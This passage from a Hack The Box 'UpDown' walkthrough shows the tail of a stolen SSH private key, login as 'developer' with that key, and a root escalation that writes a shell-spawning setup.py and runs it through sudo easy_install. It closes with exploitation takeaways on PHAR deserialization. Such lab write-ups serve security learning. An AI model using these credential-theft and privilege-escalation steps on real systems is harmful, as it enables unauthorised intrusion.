gNyFi4s68suDESmL5FCOWUuklrpkNENk7jzjhlzs3gdfU0IRCVpfmiT7LDGwX9YLfsVXtJ
mtpd5SG55TJuGJqXCyeM+U0DBdxsT5AAAAwQDDfs/CULeQUO+2Ij9rWAlKaTEKLkmZjSqB
2d9yJVHHzGPe1DZfRu0nYYonz5bfqoAh2GnYwvIp0h3nzzQo2Svv3/ugRCQwGoFP1zs1aa
ZSESqGN9EfOnUqvQa317rHnO3moDWTnYDbynVJuiQHlDaSCyf+uaZoCMINSG5IOC/4Sj0v
3zga8EzubgwnpU7r9hN2jWboCCIOeDtvXFv08KT8pFDCCA+sMa5uoWQlBqmsOWCLvtaOWe
N4jA+ppn1+3e0AAAASZGV2ZWxvcGVyQHNpdGVpc3VwAQ==
-----END OPENSSH PRIVATE KEY-----
developer@updown:/home/developer/.ssh
```
from there we are able to enumerate a `.ssh` directory in `developer`'s home folder and abscond with their private key for establishing persistence.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/updown/exploit]
└─$ chmod 600 developer_rsa                            

┌──(kali㉿kali)-[~/CTF/HTB/updown/exploit]
└─$ ssh -i developer_rsa developer@siteisup.htb
The authenticity of host 'siteisup.htb (10.129.227.227)' can't be established.
ED25519 key fingerprint is: SHA256:c0DzrPfIOA6IA7zGJh7Ee/FJ3B2g7R2KnzeUif9zCWQ
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'siteisup.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jul 14 20:24:44 UTC 2026

  System load:           0.0
  Usage of /:            50.3% of 2.84GB
  Memory usage:          24%
  Swap usage:            0%
  Processes:             228
  Users logged in:       0
  IPv4 address for eth0: 10.129.227.227
  IPv6 address for eth0: dead:beef::a0de:adff:fe6a:f694

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

8 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Last login: Tue Aug 30 11:24:44 2022 from 10.10.14.36
developer@updown:~$
```
With that key we copy it to our local machine and give it the name `developer_rsa` to keep it organized. We `chmod 600` the key file so that ssh will accept it and connect back to the machine with a stable ssh session under the user `developer`.

![Pasted image 20260714132715.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260714132715.png)
From that session we are then able to find `user.txt` inside our current user's home folder for the first flag of this machine.

```zsh
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install

```
Further enumeration shows us that `devloper` has permission to run `sudo /usr/local/bin/easy_install` as `root` with no password provided.

```zsh
developer@updown:~$ echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py
developer@updown:~$ sudo /usr/local/bin/easy_install .
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing .
Writing /home/developer/setup.cfg
Running setup.py -q bdist_egg --dist-dir /home/developer/egg-dist-tmp-RQ7TKw
# id
uid=0(root) gid=0(root) groups=0(root)

```
Found on GTFObins. We load in a shell execution script into a file named `setup.py` and then use our sudo privs on that binary to force it to "setup" in `developer`'s home directory, reading our `setup.py` and executing a shell with root privileges. box pwned.

![Pasted image 20260714133712.png](/img/user/CTFs/HTB/Images/UpDown%20Images/Pasted%20image%2020260714133712.png)
With that, we are able to `cd /root` and read out the contents of `root.txt` for the W.

## Takeaways
- Always enumerate the source code of whatever app you are **currently** sitting in. See how those scripts/binaries interact with each other. 
- Look for tools to enumerate languages like `dfunc-bypasser`. These can save a lot of time and help you understand what's accepted by a server with input restrictions
- Read Read Read. I can't really stress this one enough. Check every function. Follow the logic of homemade code, classes, and apps to find weak points.
- If the tried and true script doesn't work. Go back. Look at how you're attempting to use that script and make sure it fits any input sanitization filter (i.e. size, complexity, syntax, etc.)
- When working on PHAR deserialization specifically always remember to convert your payload to a ZIP archive so that the PHAR wrapper can parse it correctly and execute your payload. You may need to change the extension if there are any file extension rules in place for the upload. Remember that this will still be a ZIP archive even with a different extension (like .txt) and can still be deserialzed and rendered with the PHAR wrapper
- Note down any system, site, or code parameters required by the server to make certain requests happen.
- If a file you wanna upload isn't working try zipping it. Archives make uploaders act weird sometimes and that's usually a good tell for a deserial/zip style attack

[[CTFs/HTB/UpDown#Contents\|Back to Top]]


